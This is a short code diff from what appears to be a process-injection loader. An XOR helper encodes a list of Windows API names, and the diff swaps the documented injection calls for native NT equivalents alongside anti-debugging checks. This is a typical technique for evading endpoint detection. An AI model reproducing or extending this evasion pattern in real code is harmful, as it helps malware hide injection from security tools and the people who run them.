@@ -4,10 +4,10 @@ def xor(data: bytes, key: bytes) -> bytes:
     return bytes(b ^ key[i % klen] for i, b in enumerate(data))
 
 API_NAMES = [
-    "VirtualAllocEx",
-    "WriteProcessMemory",
-    "CreateRemoteThread",
-    "WaitForSingleObject",
+    "NtAllocateVirtualMemory",
+    "NtWriteVirtualMemory",
+    "NtCreateThreadEx",
+    "NtWaitForSingleObject",
     "VirtualFreeEx",
     "VirtualAllocExNuma",
     "IsDebuggerPresent",
